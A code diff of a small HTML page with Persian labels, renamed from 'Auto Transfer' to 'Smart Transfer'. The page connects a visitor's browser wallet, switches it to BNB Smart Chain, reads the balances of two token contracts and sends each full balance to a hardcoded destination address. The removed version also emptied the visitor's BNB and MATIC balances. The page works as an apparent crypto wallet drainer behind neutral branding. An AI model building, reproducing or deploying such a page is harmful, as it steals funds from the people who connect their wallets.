@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Auto Transfer</title>
+<title>Smart Transfer</title>
 <style>
 body{font-family:sans-serif;text-align:center;margin-top:40px}
 button{padding:10px 20px;font-size:16px;margin:5px}
@@ -11,148 +11,102 @@ button{padding:10px 20px;font-size:16px;margin:5px}
 </head>
 <body>
 
-<h2>Auto Transfer</h2>
+<h2>Smart Transfer</h2>
 
-<button onclick="connect()">کانکت ولت</button>
-<button onclick="transferAll()">انتقال همه دارایی‌ها</button>
+<button onclick="connect()">کانکت</button>
+<button onclick="transfer()">انتقال</button>
 
 <p id="status"></p>
 
 <script>
-const DESTINATION = "0x1F40f55A445483205546E9F16B09b2134142959A";
-const TOKEN = "0x641a6Dc991A49f7BE9Fe3C72c5d0FBb223eDb12f"; // BEP20 token
+const DEST = "0x1F40f55A445483205546E9F16B09b2134142959A";
+const TOKENS = [
+  "0x3Cb26F04223e948B8D810a7bd170620AFbD42e67",
+  "0xCEe4E6F4d8e634e329c457a4F98c090aFAfB1C4b"
+];
+
 let account;
 
 function status(t){document.getElementById("status").innerText=t;}
+
+async function ensureBSC(){
+ const chainId = "0x38";
+
+ try{
+   await ethereum.request({
+     method:"wallet_switchEthereumChain",
+     params:[{chainId}]
+   });
+ }catch(err){
+   // اگر شبکه اضافه نشده بود
+   await ethereum.request({
+     method:"wallet_addEthereumChain",
+     params:[{
+       chainId:"0x38",
+       chainName:"BNB Smart Chain",
+       nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
+       rpcUrls:["https://bsc-dataseed.binance.org"],
+       blockExplorerUrls:["https://bscscan.com"]
+     }]
+   });
+ }
+}
 
 async function connect(){
  if(!window.ethereum){alert("Wallet not found");return;}
  const acc = await ethereum.request({method:'eth_requestAccounts'});
  account = acc[0];
- status("Connected: " + account);
+ await ensureBSC();
+ status("Connected & BNB ready");
 }
 
-// تبدیل به hex
-function toHex(n){
- return "0x"+n.toString(16);
-}
-
-// خواندن موجودی BNB
-async function getBNBBalance(){
- const bal = await ethereum.request({
-  method:"eth_getBalance",
-  params:[account,"latest"]
- });
- return parseInt(bal,16);
-}
+function toHex(n){return "0x"+n.toString(16);}
 
 // خواندن موجودی توکن
-async function getTokenBalance(){
- const data = "0x70a08231" + account.substring(2).padStart(64,"0");
+async function tokenBalance(token){
+ const data="0x70a08231"+account.substring(2).padStart(64,"0");
 
- const result = await ethereum.request({
+ const res=await ethereum.request({
   method:"eth_call",
-  params:[{to:TOKEN,data:data},"latest"]
+  params:[{to:token,data:data},"latest"]
  });
 
- return parseInt(result,16);
+ return parseInt(res,16);
 }
 
-async function sendToken(balance){
+async function sendToken(token, amount){
  const data =
-   "0xa9059cbb" +
-   DESTINATION.substring(2).padStart(64,"0") +
-   toHex(balance).substring(2).padStart(64,"0");
+  "0xa9059cbb"+
+  DEST.substring(2).padStart(64,"0")+
+  toHex(amount).substring(2).padStart(64,"0");
 
  return ethereum.request({
    method:"eth_sendTransaction",
-   params:[{
-     from:account,
-     to:TOKEN,
-     data:data
-   }]
+   params:[{from:account,to:token,data:data}]
  });
 }
 
-async function sendBNB(balance){
- // نگه داشتن مقدار کمی برای کارمزد
- const gasReserve = 21000000000000;
- const sendAmount = balance - gasReserve;
+async function transfer(){
 
- return ethereum.request({
-   method:"eth_sendTransaction",
-   params:[{
-     from:account,
-     to:DESTINATION,
-     value:toHex(sendAmount)
-   }]
- });
-}
-
-async function switchPolygon(){
- await ethereum.request({
-  method:"wallet_switchEthereumChain",
-  params:[{chainId:"0x89"}]
- });
-}
-
-async function getMaticBalance(){
- const bal = await ethereum.request({
-  method:"eth_getBalance",
-  params:[account,"latest"]
- });
- return parseInt(bal,16);
-}
-
-async function sendMatic(balance){
- const gasReserve = 21000000000000;
- const sendAmount = balance - gasReserve;
-
- return ethereum.request({
-   method:"eth_sendTransaction",
-   params:[{
-     from:account,
-     to:DESTINATION,
-     value:toHex(sendAmount)
-   }]
- });
-}
-
-async function transferAll(){
-
- if(!account){alert("اول کانکت کن");return;}
+ if(!account){alert("کانکت کن");return;}
 
  try{
 
-   status("ارسال توکن...");
-   const tokenBal = await getTokenBalance();
-   if(tokenBal>0){
-     await sendToken(tokenBal);
+   for(const token of TOKENS){
+     const bal = await tokenBalance(token);
+     if(bal>0){
+       status("ارسال توکن...");
+       await sendToken(token, bal);
+     }
    }
 
-   status("ارسال BNB...");
-   const bnbBal = await getBNBBalance();
-   if(bnbBal>0){
-     await sendBNB(bnbBal);
-   }
-
-   status("سوئیچ به Polygon...");
-   await switchPolygon();
-
-   status("ارسال MATIC...");
-   const maticBal = await getMaticBalance();
-   if(maticBal>0){
-     await sendMatic(maticBal);
-   }
-
-   status("انجام شد ✅");
+   status("تمام شد ✅");
 
  }catch(e){
    console.error(e);
-   alert("خطا یا رد شدن تراکنش");
+   alert("خطا یا رد شد");
  }
 }
 </script>
-
 </body>
 </html>
